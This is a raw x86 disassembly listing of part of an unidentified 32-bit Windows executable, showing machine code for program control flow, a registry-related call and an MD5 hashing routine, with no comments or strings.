  40b15a:	0f 85 4e ff ff ff    	jne    0x40b0ae
  40b160:	66 f7 45 08 00 01    	testw  $0x100,0x8(%ebp)
  40b166:	74 0f                	je     0x40b177
  40b168:	6a 05                	push   $0x5
  40b16a:	68 00 f4 40 00       	push   $0x40f400
  40b16f:	ff 15 7c e1 40 00    	call   *0x40e17c
  40b175:	eb 06                	jmp    0x40b17d
  40b177:	ff 15 90 e1 40 00    	call   *0x40e190
  40b17d:	e8 36 81 ff ff       	call   0x4032b8
  40b182:	85 c0                	test   %eax,%eax
  40b184:	75 13                	jne    0x40b199
  40b186:	6a 04                	push   $0x4
  40b188:	ff 15 64 e0 40 00    	call   *0x40e064
  40b18e:	50                   	push   %eax
  40b18f:	6a 0a                	push   $0xa
  40b191:	e8 f0 f5 ff ff       	call   0x40a786
  40b196:	83 c4 0c             	add    $0xc,%esp
  40b199:	33 f6                	xor    %esi,%esi
  40b19b:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  40b1a2:	c7 45 08 54 a7 41 00 	movl   $0x41a754,0x8(%ebp)
  40b1a9:	8b 45 08             	mov    0x8(%ebp),%eax
  40b1ac:	39 18                	cmp    %ebx,(%eax)
  40b1ae:	74 1e                	je     0x40b1ce
  40b1b0:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40b1b3:	53                   	push   %ebx
  40b1b4:	53                   	push   %ebx
  40b1b5:	8d 44 b5 a4          	lea    -0x5c(%ebp,%esi,4),%eax
  40b1b9:	50                   	push   %eax
  40b1ba:	68 23 b0 40 00       	push   $0x40b023
  40b1bf:	53                   	push   %ebx
  40b1c0:	53                   	push   %ebx
  40b1c1:	89 08                	mov    %ecx,(%eax)
  40b1c3:	ff 15 48 e0 40 00    	call   *0x40e048
  40b1c9:	89 44 b5 cc          	mov    %eax,-0x34(%ebp,%esi,4)
  40b1cd:	46                   	inc    %esi
  40b1ce:	ff 45 f8             	incl   -0x8(%ebp)
  40b1d1:	81 45 08 44 01 00 00 	addl   $0x144,0x8(%ebp)
  40b1d8:	81 7d 08 b8 b2 41 00 	cmpl   $0x41b2b8,0x8(%ebp)
  40b1df:	7c c8                	jl     0x40b1a9
  40b1e1:	39 1d 10 a6 41 00    	cmp    %ebx,0x41a610
  40b1e7:	75 04                	jne    0x40b1ed
  40b1e9:	3b f3                	cmp    %ebx,%esi
  40b1eb:	74 34                	je     0x40b221
  40b1ed:	6a 04                	push   $0x4
  40b1ef:	53                   	push   %ebx
  40b1f0:	6a 0c                	push   $0xc
  40b1f2:	e8 8f f5 ff ff       	call   0x40a786
  40b1f7:	83 c4 0c             	add    $0xc,%esp
  40b1fa:	39 1d 10 a6 41 00    	cmp    %ebx,0x41a610
  40b200:	74 0c                	je     0x40b20e
  40b202:	8d 45 08             	lea    0x8(%ebp),%eax
  40b205:	50                   	push   %eax
  40b206:	89 5d 08             	mov    %ebx,0x8(%ebp)
  40b209:	e8 15 fe ff ff       	call   0x40b023
  40b20e:	3b f3                	cmp    %ebx,%esi
  40b210:	74 0f                	je     0x40b221
  40b212:	6a ff                	push   $0xffffffff
  40b214:	6a 01                	push   $0x1
  40b216:	8d 45 cc             	lea    -0x34(%ebp),%eax
  40b219:	50                   	push   %eax
  40b21a:	56                   	push   %esi
  40b21b:	ff 15 4c e0 40 00    	call   *0x40e04c
  40b221:	3b f3                	cmp    %ebx,%esi
  40b223:	89 5d 08             	mov    %ebx,0x8(%ebp)
  40b226:	7e 15                	jle    0x40b23d
  40b228:	8b 45 08             	mov    0x8(%ebp),%eax
  40b22b:	ff 74 85 cc          	push   -0x34(%ebp,%eax,4)
  40b22f:	ff 15 c4 e0 40 00    	call   *0x40e0c4
  40b235:	ff 45 08             	incl   0x8(%ebp)
  40b238:	39 75 08             	cmp    %esi,0x8(%ebp)
  40b23b:	7c eb                	jl     0x40b228
  40b23d:	e8 87 f4 ff ff       	call   0x40a6c9
  40b242:	ff 15 90 e1 40 00    	call   *0x40e190
  40b248:	39 5d f4             	cmp    %ebx,-0xc(%ebp)
  40b24b:	74 79                	je     0x40b2c6
  40b24d:	81 3d 60 50 41 00 c1 	cmpl   $0x2c1,0x415060
  40b254:	02 00 00 
  40b257:	7e 6d                	jle    0x40b2c6
  40b259:	39 1d a4 06 42 00    	cmp    %ebx,0x4206a4
  40b25f:	74 65                	je     0x40b2c6
  40b261:	be 00 10 00 00       	mov    $0x1000,%esi
  40b266:	56                   	push   %esi
  40b267:	57                   	push   %edi
  40b268:	53                   	push   %ebx
  40b269:	ff 15 b0 e0 40 00    	call   *0x40e0b0
  40b26f:	85 c0                	test   %eax,%eax
  40b271:	74 09                	je     0x40b27c
  40b273:	8b d7                	mov    %edi,%edx
  40b275:	e8 7f ba ff ff       	call   0x406cf9
  40b27a:	eb 08                	jmp    0x40b284
  40b27c:	57                   	push   %edi
  40b27d:	56                   	push   %esi
  40b27e:	ff 15 d4 e0 40 00    	call   *0x40e0d4
  40b284:	8d 85 a4 df ff ff    	lea    -0x205c(%ebp),%eax
  40b28a:	50                   	push   %eax
  40b28b:	8b d7                	mov    %edi,%edx
  40b28d:	e8 7f a2 ff ff       	call   0x405511
  40b292:	59                   	pop    %ecx
  40b293:	b9 f0 f2 40 00       	mov    $0x40f2f0,%ecx
  40b298:	8d 85 a4 df ff ff    	lea    -0x205c(%ebp),%eax
  40b29e:	e8 4a a2 ff ff       	call   0x4054ed
  40b2a3:	53                   	push   %ebx
  40b2a4:	53                   	push   %ebx
  40b2a5:	6a 01                	push   $0x1
  40b2a7:	ff 35 38 08 42 00    	push   0x420838
  40b2ad:	53                   	push   %ebx
  40b2ae:	50                   	push   %eax
  40b2af:	53                   	push   %ebx
  40b2b0:	ff 35 d0 3d 42 00    	push   0x423dd0
  40b2b6:	e8 81 72 ff ff       	call   0x40253c
  40b2bb:	83 c4 20             	add    $0x20,%esp
  40b2be:	85 c0                	test   %eax,%eax
  40b2c0:	0f 85 e8 fd ff ff    	jne    0x40b0ae
  40b2c6:	33 c0                	xor    %eax,%eax
  40b2c8:	40                   	inc    %eax
  40b2c9:	5f                   	pop    %edi
  40b2ca:	5e                   	pop    %esi
  40b2cb:	5b                   	pop    %ebx
  40b2cc:	c9                   	leave
  40b2cd:	c3                   	ret
  40b2ce:	55                   	push   %ebp
  40b2cf:	8b ec                	mov    %esp,%ebp
  40b2d1:	83 e4 f8             	and    $0xfffffff8,%esp
  40b2d4:	56                   	push   %esi
  40b2d5:	57                   	push   %edi
  40b2d6:	33 ff                	xor    %edi,%edi
  40b2d8:	57                   	push   %edi
  40b2d9:	ff 15 a8 e1 40 00    	call   *0x40e1a8
  40b2df:	57                   	push   %edi
  40b2e0:	eb 30                	jmp    0x40b312
  40b2e2:	81 e6 00 00 20 00    	and    $0x200000,%esi
  40b2e8:	75 04                	jne    0x40b2ee
  40b2ea:	85 ff                	test   %edi,%edi
  40b2ec:	75 37                	jne    0x40b325
  40b2ee:	85 f6                	test   %esi,%esi
  40b2f0:	74 15                	je     0x40b307
  40b2f2:	0f b6 05 f8 3b 42 00 	movzbl 0x423bf8,%eax
  40b2f9:	33 f6                	xor    %esi,%esi
  40b2fb:	50                   	push   %eax
  40b2fc:	32 c9                	xor    %cl,%cl
  40b2fe:	46                   	inc    %esi
  40b2ff:	e8 4e c2 ff ff       	call   0x407552
  40b304:	59                   	pop    %ecx
  40b305:	eb 0a                	jmp    0x40b311
  40b307:	33 ff                	xor    %edi,%edi
  40b309:	47                   	inc    %edi
  40b30a:	33 f6                	xor    %esi,%esi
  40b30c:	e8 51 c0 ff ff       	call   0x407362
  40b311:	56                   	push   %esi
  40b312:	e8 7c f9 ff ff       	call   0x40ac93
  40b317:	59                   	pop    %ecx
  40b318:	8b f0                	mov    %eax,%esi
  40b31a:	56                   	push   %esi
  40b31b:	e8 76 fd ff ff       	call   0x40b096
  40b320:	85 c0                	test   %eax,%eax
  40b322:	59                   	pop    %ecx
  40b323:	75 bd                	jne    0x40b2e2
  40b325:	ff 35 e4 14 41 00    	push   0x4114e4
  40b32b:	ff 15 94 e1 40 00    	call   *0x40e194
  40b331:	83 25 e4 14 41 00 00 	andl   $0x0,0x4114e4
  40b338:	e8 8c f3 ff ff       	call   0x40a6c9
  40b33d:	6a 00                	push   $0x0
  40b33f:	ff 15 60 e0 40 00    	call   *0x40e060
  40b345:	cc                   	int3
  40b346:	55                   	push   %ebp
  40b347:	8b ec                	mov    %esp,%ebp
  40b349:	b8 00 18 00 00       	mov    $0x1800,%eax
  40b34e:	e8 5d 22 00 00       	call   0x40d5b0
  40b353:	53                   	push   %ebx
  40b354:	56                   	push   %esi
  40b355:	57                   	push   %edi
  40b356:	8b 3d b0 e0 40 00    	mov    0x40e0b0,%edi
  40b35c:	be 00 04 00 00       	mov    $0x400,%esi
  40b361:	56                   	push   %esi
  40b362:	8d 85 00 f8 ff ff    	lea    -0x800(%ebp),%eax
  40b368:	50                   	push   %eax
  40b369:	33 db                	xor    %ebx,%ebx
  40b36b:	53                   	push   %ebx
  40b36c:	ff d7                	call   *%edi
  40b36e:	68 fc f4 40 00       	push   $0x40f4fc
  40b373:	8d 85 00 f8 ff ff    	lea    -0x800(%ebp),%eax
  40b379:	e8 15 a1 ff ff       	call   0x405493
  40b37e:	85 c0                	test   %eax,%eax
  40b380:	59                   	pop    %ecx
  40b381:	74 5d                	je     0x40b3e0
  40b383:	8d 85 00 e8 ff ff    	lea    -0x1800(%ebp),%eax
  40b389:	50                   	push   %eax
  40b38a:	e8 91 f8 ff ff       	call   0x40ac20
  40b38f:	85 c0                	test   %eax,%eax
  40b391:	59                   	pop    %ecx
  40b392:	75 4c                	jne    0x40b3e0
  40b394:	56                   	push   %esi
  40b395:	8d 85 00 f8 ff ff    	lea    -0x800(%ebp),%eax
  40b39b:	50                   	push   %eax
  40b39c:	53                   	push   %ebx
  40b39d:	ff d7                	call   *%edi
  40b39f:	6a 01                	push   $0x1
  40b3a1:	8d 85 00 f8 ff ff    	lea    -0x800(%ebp),%eax
  40b3a7:	50                   	push   %eax
  40b3a8:	68 14 f4 40 00       	push   $0x40f414
  40b3ad:	68 d8 f1 40 00       	push   $0x40f1d8
  40b3b2:	68 01 00 00 80       	push   $0x80000001
  40b3b7:	e8 41 b6 ff ff       	call   0x4069fd
  40b3bc:	83 c4 14             	add    $0x14,%esp
  40b3bf:	85 c0                	test   %eax,%eax
  40b3c1:	6a 04                	push   $0x4
  40b3c3:	74 05                	je     0x40b3ca
  40b3c5:	53                   	push   %ebx
  40b3c6:	6a 03                	push   $0x3
  40b3c8:	eb 09                	jmp    0x40b3d3
  40b3ca:	ff 15 64 e0 40 00    	call   *0x40e064
  40b3d0:	50                   	push   %eax
  40b3d1:	6a 06                	push   $0x6
  40b3d3:	e8 ae f3 ff ff       	call   0x40a786
  40b3d8:	83 c4 0c             	add    $0xc,%esp
  40b3db:	e8 ee fe ff ff       	call   0x40b2ce
  40b3e0:	e8 18 f7 ff ff       	call   0x40aafd
  40b3e5:	85 c0                	test   %eax,%eax
  40b3e7:	75 f2                	jne    0x40b3db
  40b3e9:	e8 8e f7 ff ff       	call   0x40ab7c
  40b3ee:	85 c0                	test   %eax,%eax
  40b3f0:	74 61                	je     0x40b453
  40b3f2:	68 10 27 00 00       	push   $0x2710
  40b3f7:	ff 15 70 e0 40 00    	call   *0x40e070
  40b3fd:	6a 04                	push   $0x4
  40b3ff:	53                   	push   %ebx
  40b400:	6a 09                	push   $0x9
  40b402:	e8 7f f3 ff ff       	call   0x40a786
  40b407:	83 c4 0c             	add    $0xc,%esp
  40b40a:	56                   	push   %esi
  40b40b:	8d 85 00 e8 ff ff    	lea    -0x1800(%ebp),%eax
  40b411:	50                   	push   %eax
  40b412:	53                   	push   %ebx
  40b413:	ff d7                	call   *%edi
  40b415:	8d 85 00 f8 ff ff    	lea    -0x800(%ebp),%eax
  40b41b:	50                   	push   %eax
  40b41c:	e8 ff f7 ff ff       	call   0x40ac20
  40b421:	85 c0                	test   %eax,%eax
  40b423:	59                   	pop    %ecx
  40b424:	74 2d                	je     0x40b453
  40b426:	53                   	push   %ebx
  40b427:	8d 85 00 f8 ff ff    	lea    -0x800(%ebp),%eax
  40b42d:	50                   	push   %eax
  40b42e:	8d 85 00 e8 ff ff    	lea    -0x1800(%ebp),%eax
  40b434:	50                   	push   %eax
  40b435:	ff 15 44 e0 40 00    	call   *0x40e044
  40b43b:	85 c0                	test   %eax,%eax
  40b43d:	74 14                	je     0x40b453
  40b43f:	8d 85 00 f8 ff ff    	lea    -0x800(%ebp),%eax
  40b445:	50                   	push   %eax
  40b446:	e8 a5 c3 ff ff       	call   0x4077f0
  40b44b:	59                   	pop    %ecx
  40b44c:	53                   	push   %ebx
  40b44d:	ff 15 60 e0 40 00    	call   *0x40e060
  40b453:	e8 81 f7 ff ff       	call   0x40abd9
  40b458:	85 c0                	test   %eax,%eax
  40b45a:	74 51                	je     0x40b4ad
  40b45c:	8d 85 00 f8 ff ff    	lea    -0x800(%ebp),%eax
  40b462:	50                   	push   %eax
  40b463:	e8 b8 f7 ff ff       	call   0x40ac20
  40b468:	8d 85 00 f8 ff ff    	lea    -0x800(%ebp),%eax
  40b46e:	50                   	push   %eax
  40b46f:	e8 b3 c2 ff ff       	call   0x407727
  40b474:	85 c0                	test   %eax,%eax
  40b476:	59                   	pop    %ecx
  40b477:	59                   	pop    %ecx
  40b478:	74 1e                	je     0x40b498
  40b47a:	8d 85 00 f8 ff ff    	lea    -0x800(%ebp),%eax
  40b480:	50                   	push   %eax
  40b481:	e8 6a c3 ff ff       	call   0x4077f0
  40b486:	85 c0                	test   %eax,%eax
  40b488:	59                   	pop    %ecx
  40b489:	75 c1                	jne    0x40b44c
  40b48b:	6a 04                	push   $0x4
  40b48d:	ff 15 64 e0 40 00    	call   *0x40e064
  40b493:	50                   	push   %eax
  40b494:	6a 0b                	push   $0xb
  40b496:	eb 0b                	jmp    0x40b4a3
  40b498:	6a 04                	push   $0x4
  40b49a:	ff 15 64 e0 40 00    	call   *0x40e064
  40b4a0:	50                   	push   %eax
  40b4a1:	6a 01                	push   $0x1
  40b4a3:	e8 de f2 ff ff       	call   0x40a786
  40b4a8:	83 c4 0c             	add    $0xc,%esp
  40b4ab:	eb 9f                	jmp    0x40b44c
  40b4ad:	53                   	push   %ebx
  40b4ae:	e8 74 c2 ff ff       	call   0x407727
  40b4b3:	3b c3                	cmp    %ebx,%eax
  40b4b5:	59                   	pop    %ecx
  40b4b6:	56                   	push   %esi
  40b4b7:	74 16                	je     0x40b4cf
  40b4b9:	8d 8d 00 f0 ff ff    	lea    -0x1000(%ebp),%ecx
  40b4bf:	51                   	push   %ecx
  40b4c0:	ff 34 85 40 10 41 00 	push   0x411040(,%eax,4)
  40b4c7:	ff 15 7c e0 40 00    	call   *0x40e07c
  40b4cd:	eb 1a                	jmp    0x40b4e9
  40b4cf:	8d 85 00 f0 ff ff    	lea    -0x1000(%ebp),%eax
  40b4d5:	50                   	push   %eax
  40b4d6:	53                   	push   %ebx
  40b4d7:	ff d7                	call   *%edi
  40b4d9:	b9 a8 f2 40 00       	mov    $0x40f2a8,%ecx
  40b4de:	8d 85 00 f0 ff ff    	lea    -0x1000(%ebp),%eax
  40b4e4:	e8 04 a0 ff ff       	call   0x4054ed
  40b4e9:	8d 85 00 f0 ff ff    	lea    -0x1000(%ebp),%eax
  40b4ef:	50                   	push   %eax
  40b4f0:	e8 fb c2 ff ff       	call   0x4077f0
  40b4f5:	85 c0                	test   %eax,%eax
  40b4f7:	59                   	pop    %ecx
  40b4f8:	0f 85 4e ff ff ff    	jne    0x40b44c
  40b4fe:	6a 04                	push   $0x4
  40b500:	ff 15 64 e0 40 00    	call   *0x40e064
  40b506:	50                   	push   %eax
  40b507:	6a 0b                	push   $0xb
  40b509:	e8 78 f2 ff ff       	call   0x40a786
  40b50e:	83 c4 0c             	add    $0xc,%esp
  40b511:	89 1d 58 10 41 00    	mov    %ebx,0x411058
  40b517:	e9 bf fe ff ff       	jmp    0x40b3db
  40b51c:	55                   	push   %ebp
  40b51d:	8b ec                	mov    %esp,%ebp
  40b51f:	81 ec 88 00 00 00    	sub    $0x88,%esp
  40b525:	a8 03                	test   $0x3,%al
  40b527:	8b 4e 08             	mov    0x8(%esi),%ecx
  40b52a:	53                   	push   %ebx
  40b52b:	8b 5e 14             	mov    0x14(%esi),%ebx
  40b52e:	57                   	push   %edi
  40b52f:	8b 7e 0c             	mov    0xc(%esi),%edi
  40b532:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  40b535:	8b 4e 10             	mov    0x10(%esi),%ecx
  40b538:	89 7d f0             	mov    %edi,-0x10(%ebp)
  40b53b:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  40b53e:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  40b541:	74 18                	je     0x40b55b
  40b543:	6a 40                	push   $0x40
  40b545:	50                   	push   %eax
  40b546:	8d 85 78 ff ff ff    	lea    -0x88(%ebp),%eax
  40b54c:	50                   	push   %eax
  40b54d:	e8 7e 10 00 00       	call   0x40c5d0
  40b552:	83 c4 0c             	add    $0xc,%esp
  40b555:	8d 85 78 ff ff ff    	lea    -0x88(%ebp),%eax
  40b55b:	8b 08                	mov    (%eax),%ecx
  40b55d:	8b d7                	mov    %edi,%edx
  40b55f:	f7 d2                	not    %edx
  40b561:	23 d3                	and    %ebx,%edx
  40b563:	8b 5d f8             	mov    -0x8(%ebp),%ebx
  40b566:	23 df                	and    %edi,%ebx
  40b568:	0b d3                	or     %ebx,%edx
  40b56a:	03 d1                	add    %ecx,%edx
  40b56c:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40b56f:	8d 8c 0a 78 a4 6a d7 	lea    -0x28955b88(%edx,%ecx,1),%ecx
  40b576:	8b df                	mov    %edi,%ebx
  40b578:	c1 c1 07             	rol    $0x7,%ecx
  40b57b:	03 cf                	add    %edi,%ecx
  40b57d:	23 d9                	and    %ecx,%ebx
  40b57f:	8b d1                	mov    %ecx,%edx
  40b581:	f7 d2                	not    %edx
  40b583:	23 55 f8             	and    -0x8(%ebp),%edx
  40b586:	0b d3                	or     %ebx,%edx
  40b588:	03 50 04             	add    0x4(%eax),%edx
  40b58b:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  40b58e:	8d 94 1a 56 b7 c7 e8 	lea    -0x173848aa(%edx,%ebx,1),%edx
  40b595:	c1 c2 0c             	rol    $0xc,%edx
  40b598:	03 d1                	add    %ecx,%edx
  40b59a:	8b da                	mov    %edx,%ebx
  40b59c:	f7 d3                	not    %ebx
  40b59e:	23 df                	and    %edi,%ebx
  40b5a0:	8b fa                	mov    %edx,%edi
  40b5a2:	23 f9                	and    %ecx,%edi
  40b5a4:	0b df                	or     %edi,%ebx
  40b5a6:	03 58 08             	add    0x8(%eax),%ebx
  40b5a9:	8b 7d f8             	mov    -0x8(%ebp),%edi
  40b5ac:	8d bc 3b db 70 20 24 	lea    0x242070db(%ebx,%edi,1),%edi
  40b5b3:	c1 cf 0f             	ror    $0xf,%edi
  40b5b6:	03 fa                	add    %edx,%edi
  40b5b8:	8b df                	mov    %edi,%ebx
  40b5ba:	f7 d3                	not    %ebx
  40b5bc:	23 d9                	and    %ecx,%ebx
  40b5be:	89 55 fc             	mov    %edx,-0x4(%ebp)
  40b5c1:	23 d7                	and    %edi,%edx
  40b5c3:	0b da                	or     %edx,%ebx
  40b5c5:	03 58 0c             	add    0xc(%eax),%ebx
  40b5c8:	8b 55 f0             	mov    -0x10(%ebp),%edx
  40b5cb:	8d 94 13 ee ce bd c1 	lea    -0x3e423112(%ebx,%edx,1),%edx
  40b5d2:	89 7d f8             	mov    %edi,-0x8(%ebp)
  40b5d5:	c1 ca 0a             	ror    $0xa,%edx
  40b5d8:	03 d7                	add    %edi,%edx
  40b5da:	23 fa                	and    %edx,%edi
  40b5dc:	8b da                	mov    %edx,%ebx
  40b5de:	f7 d3                	not    %ebx
  40b5e0:	23 5d fc             	and    -0x4(%ebp),%ebx
  40b5e3:	0b df                	or     %edi,%ebx
  40b5e5:	03 58 10             	add    0x10(%eax),%ebx
  40b5e8:	8d 8c 0b af 0f 7c f5 	lea    -0xa83f051(%ebx,%ecx,1),%ecx
  40b5ef:	c1 c1 07             	rol    $0x7,%ecx
  40b5f2:	03 ca                	add    %edx,%ecx
  40b5f4:	8b f9                	mov    %ecx,%edi
  40b5f6:	f7 d7                	not    %edi
  40b5f8:	23 7d f8             	and    -0x8(%ebp),%edi
  40b5fb:	8b da                	mov    %edx,%ebx
  40b5fd:	23 d9                	and    %ecx,%ebx
  40b5ff:	0b fb                	or     %ebx,%edi
  40b601:	03 78 14             	add    0x14(%eax),%edi
  40b604:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  40b607:	8d bc 1f 2a c6 87 47 	lea    0x4787c62a(%edi,%ebx,1),%edi
  40b60e:	c1 c7 0c             	rol    $0xc,%edi
  40b611:	03 f9                	add    %ecx,%edi
  40b613:	8b df                	mov    %edi,%ebx
  40b615:	f7 d3                	not    %ebx
  40b617:	89 7d fc             	mov    %edi,-0x4(%ebp)
  40b61a:	23 da                	and    %edx,%ebx
  40b61c:	23 f9                	and    %ecx,%edi
  40b61e:	0b df                	or     %edi,%ebx
  40b620:	03 58 18             	add    0x18(%eax),%ebx
  40b623:	8b 7d f8             	mov    -0x8(%ebp),%edi
  40b626:	8d bc 3b 13 46 30 a8 	lea    -0x57cfb9ed(%ebx,%edi,1),%edi
  40b62d:	c1 cf 0f             	ror    $0xf,%edi
  40b630:	03 7d fc             	add    -0x4(%ebp),%edi
  40b633:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  40b636:	8b df                	mov    %edi,%ebx
  40b638:	f7 d3                	not    %ebx
  40b63a:	23 d9                	and    %ecx,%ebx
  40b63c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40b63f:	23 cf                	and    %edi,%ecx
  40b641:	0b d9                	or     %ecx,%ebx
  40b643:	8b 48 1c             	mov    0x1c(%eax),%ecx
  40b646:	03 d9                	add    %ecx,%ebx
  40b648:	8d 94 13 01 95 46 fd 	lea    -0x2b96aff(%ebx,%edx,1),%edx
  40b64f:	c1 ca 0a             	ror    $0xa,%edx
  40b652:	03 d7                	add    %edi,%edx
  40b654:	89 4d c0             	mov    %ecx,-0x40(%ebp)
  40b657:	8b ca                	mov    %edx,%ecx
  40b659:	8b df                	mov    %edi,%ebx
  40b65b:	23 da                	and    %edx,%ebx
  40b65d:	f7 d1                	not    %ecx
  40b65f:	23 4d fc             	and    -0x4(%ebp),%ecx
  40b662:	89 55 f0             	mov    %edx,-0x10(%ebp)
  40b665:	0b cb                	or     %ebx,%ecx
  40b667:	03 48 20             	add    0x20(%eax),%ecx
  40b66a:	8b 5d f4             	mov    -0xc(%ebp),%ebx
  40b66d:	8d 8c 19 d8 98 80 69 	lea    0x698098d8(%ecx,%ebx,1),%ecx
  40b674:	c1 c1 07             	rol    $0x7,%ecx
  40b677:	03 ca                	add    %edx,%ecx
  40b679:	23 d1                	and    %ecx,%edx
  40b67b:	8b d9                	mov    %ecx,%ebx
  40b67d:	f7 d3                	not    %ebx
  40b67f:	23 df                	and    %edi,%ebx
  40b681:	0b da                	or     %edx,%ebx
  40b683:	03 58 24             	add    0x24(%eax),%ebx
  40b686:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40b689:	8d 94 13 af f7 44 8b 	lea    -0x74bb0851(%ebx,%edx,1),%edx
  40b690:	c1 c2 0c             	rol    $0xc,%edx
  40b693:	03 d1                	add    %ecx,%edx
  40b695:	89 55 fc             	mov    %edx,-0x4(%ebp)
  40b698:	8b da                	mov    %edx,%ebx
  40b69a:	f7 d3                	not    %ebx
  40b69c:	23 5d f0             	and    -0x10(%ebp),%ebx
  40b69f:	23 d1                	and    %ecx,%edx
  40b6a1:	0b da                	or     %edx,%ebx
  40b6a3:	03 58 28             	add    0x28(%eax),%ebx
  40b6a6:	8d bc 3b b1 5b ff ff 	lea    -0xa44f(%ebx,%edi,1),%edi
  40b6ad:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  40b6b0:	c1 cf 0f             	ror    $0xf,%edi
  40b6b3:	03 7d fc             	add    -0x4(%ebp),%edi
  40b6b6:	23 df                	and    %edi,%ebx
  40b6b8:	8b d7                	mov    %edi,%edx
  40b6ba:	f7 d2                	not    %edx
  40b6bc:	23 d1                	and    %ecx,%edx
  40b6be:	0b d3                	or     %ebx,%edx
  40b6c0:	03 50 2c             	add    0x2c(%eax),%edx
  40b6c3:	8b 5d f0             	mov    -0x10(%ebp),%ebx
  40b6c6:	8d 94 1a be d7 5c 89 	lea    -0x76a32842(%edx,%ebx,1),%edx
  40b6cd:	c1 ca 0a             	ror    $0xa,%edx
  40b6d0:	03 d7                	add    %edi,%edx
  40b6d2:	89 7d f8             	mov    %edi,-0x8(%ebp)
  40b6d5:	23 fa                	and    %edx,%edi
  40b6d7:	8b da                	mov    %edx,%ebx
  40b6d9:	f7 d3                	not    %ebx
  40b6db:	23 5d fc             	and    -0x4(%ebp),%ebx
  40b6de:	0b df                	or     %edi,%ebx
  40b6e0:	8b 78 30             	mov    0x30(%eax),%edi
  40b6e3:	03 df                	add    %edi,%ebx
  40b6e5:	8d 8c 0b 22 11 90 6b 	lea    0x6b901122(%ebx,%ecx,1),%ecx
  40b6ec:	89 7d d8             	mov    %edi,-0x28(%ebp)
  40b6ef:	c1 c1 07             	rol    $0x7,%ecx
  40b6f2:	03 ca                	add    %edx,%ecx
  40b6f4:	8b f9                	mov    %ecx,%edi
  40b6f6:	f7 d7                	not    %edi
  40b6f8:	23 7d f8             	and    -0x8(%ebp),%edi
  40b6fb:	8b da                	mov    %edx,%ebx
  40b6fd:	23 d9                	and    %ecx,%ebx
  40b6ff:	0b fb                	or     %ebx,%edi
  40b701:	03 78 34             	add    0x34(%eax),%edi
  40b704:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  40b707:	8d bc 1f 93 71 98 fd 	lea    -0x2678e6d(%edi,%ebx,1),%edi
  40b70e:	c1 c7 0c             	rol    $0xc,%edi
  40b711:	03 f9                	add    %ecx,%edi
  40b713:	89 7d f0             	mov    %edi,-0x10(%ebp)
  40b716:	f7 55 f0             	notl   -0x10(%ebp)
  40b719:	8b 5d f0             	mov    -0x10(%ebp),%ebx
  40b71c:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  40b71f:	89 7d fc             	mov    %edi,-0x4(%ebp)
  40b722:	23 da                	and    %edx,%ebx
  40b724:	23 f9                	and    %ecx,%edi
  40b726:	0b df                	or     %edi,%ebx
  40b728:	03 58 38             	add    0x38(%eax),%ebx
  40b72b:	8b 7d f8             	mov    -0x8(%ebp),%edi
  40b72e:	8d bc 3b 8e 43 79 a6 	lea    -0x5986bc72(%ebx,%edi,1),%edi
  40b735:	c1 cf 0f             	ror    $0xf,%edi
  40b738:	03 7d fc             	add    -0x4(%ebp),%edi
  40b73b:	89 7d f8             	mov    %edi,-0x8(%ebp)
  40b73e:	f7 55 f8             	notl   -0x8(%ebp)
  40b741:	8b 5d f8             	mov    -0x8(%ebp),%ebx
  40b744:	23 d9                	and    %ecx,%ebx
  40b746:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40b749:	23 cf                	and    %edi,%ecx
  40b74b:	0b d9                	or     %ecx,%ebx
  40b74d:	03 58 3c             	add    0x3c(%eax),%ebx
  40b750:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40b753:	23 cf                	and    %edi,%ecx
  40b755:	8d 94 13 21 08 b4 49 	lea    0x49b40821(%ebx,%edx,1),%edx
  40b75c:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  40b75f:	c1 ca 0a             	ror    $0xa,%edx
  40b762:	03 d7                	add    %edi,%edx
  40b764:	23 da                	and    %edx,%ebx
  40b766:	0b cb                	or     %ebx,%ecx
  40b768:	03 48 04             	add    0x4(%eax),%ecx
  40b76b:	8b 5d f4             	mov    -0xc(%ebp),%ebx
  40b76e:	8d 8c 19 62 25 1e f6 	lea    -0x9e1da9e(%ecx,%ebx,1),%ecx
  40b775:	8b 5d f8             	mov    -0x8(%ebp),%ebx
  40b778:	23 da                	and    %edx,%ebx
  40b77a:	c1 c1 05             	rol    $0x5,%ecx
  40b77d:	03 ca                	add    %edx,%ecx
  40b77f:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  40b782:	8b df                	mov    %edi,%ebx
  40b784:	23 d9                	and    %ecx,%ebx
  40b786:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  40b789:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40b78c:	0b cb                	or     %ebx,%ecx
  40b78e:	03 48 18             	add    0x18(%eax),%ecx
  40b791:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  40b794:	8d 8c 19 40 b3 40 c0 	lea    -0x3fbf4cc0(%ecx,%ebx,1),%ecx
  40b79b:	c1 c1 09             	rol    $0x9,%ecx
  40b79e:	03 4d f4             	add    -0xc(%ebp),%ecx
  40b7a1:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40b7a4:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  40b7a7:	23 da                	and    %edx,%ebx
  40b7a9:	8b ca                	mov    %edx,%ecx
  40b7ab:	f7 d1                	not    %ecx
  40b7ad:	23 4d f4             	and    -0xc(%ebp),%ecx
  40b7b0:	0b cb                	or     %ebx,%ecx
  40b7b2:	03 48 2c             	add    0x2c(%eax),%ecx
  40b7b5:	8d bc 39 51 5a 5e 26 	lea    0x265e5a51(%ecx,%edi,1),%edi
  40b7bc:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40b7bf:	c1 c7 0e             	rol    $0xe,%edi
  40b7c2:	03 7d fc             	add    -0x4(%ebp),%edi
